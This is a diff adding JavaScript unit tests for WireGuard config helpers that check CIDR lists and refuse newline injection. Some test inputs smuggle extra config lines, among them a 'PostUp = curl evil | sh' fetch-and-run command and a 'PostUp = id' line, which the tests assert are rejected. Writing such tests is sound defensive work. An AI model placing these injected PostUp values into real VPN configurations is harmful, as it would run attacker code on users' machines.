@@ -77,3 +77,37 @@ test('defaultSplitRoutes copes with no router addresses or junk', () => {
   assert.deepEqual(defaultSplitRoutes(null, '192.168.168.0/24', 'WireGuard'), ['192.168.168.0/24']);
   assert.deepEqual(defaultSplitRoutes([{ address: 'nope' }], 'bad', 'WireGuard'), []);
 });
+
+const { isIpv4CidrList, normalizeCidrList, buildConfig } = require('../src/util/wireguard');
+
+test('isIpv4CidrList accepts CIDR lists and rejects injection attempts', () => {
+  assert.equal(isIpv4CidrList('0.0.0.0/0'), true);
+  assert.equal(isIpv4CidrList('192.168.168.0/24, 10.100.0.0/16'), true);
+  assert.equal(isIpv4CidrList('10.0.0.0/24\nPostUp = curl evil | sh'), false);
+  assert.equal(isIpv4CidrList('10.0.0.0/24\r\nDNS = 1.1.1.1'), false);
+  assert.equal(isIpv4CidrList('10.0.0.0'), false, 'prefix required');
+  assert.equal(isIpv4CidrList('10.0.0.0/33'), false);
+  assert.equal(isIpv4CidrList('999.0.0.0/8'), false);
+  assert.equal(isIpv4CidrList('fd00::/8'), false);
+  assert.equal(isIpv4CidrList(''), false);
+});
+
+test('normalizeCidrList tidies spacing', () => {
+  assert.equal(normalizeCidrList(' 10.0.0.0/8,192.168.1.0/24 ,'), '10.0.0.0/8, 192.168.1.0/24');
+});
+
+const baseCfg = {
+  name: 'Jane', privateKey: 'priv', psk: 'psk', serverPublicKey: 'pub',
+  allowedAddress: '192.168.168.5/32', clientAddress: '192.168.168.5/24', clientDns: '192.168.168.1',
+  clientEndpoint: 'vpn.example.test', clientAllowedAddresses: '0.0.0.0/0', listenPort: 13231,
+};
+
+test('buildConfig appends the listen port only when the endpoint has none', () => {
+  assert.match(buildConfig(baseCfg), /^Endpoint = vpn\.example\.test:13231$/m);
+  assert.match(buildConfig({ ...baseCfg, clientEndpoint: 'vpn.example.test:51820' }), /^Endpoint = vpn\.example\.test:51820$/m);
+});
+
+test('buildConfig refuses values containing newlines', () => {
+  assert.throws(() => buildConfig({ ...baseCfg, clientAllowedAddresses: '0.0.0.0/0\nPostUp = id' }), /Invalid characters/);
+  assert.throws(() => buildConfig({ ...baseCfg, name: 'x\r\n[Peer]' }), /Invalid characters/);
+});
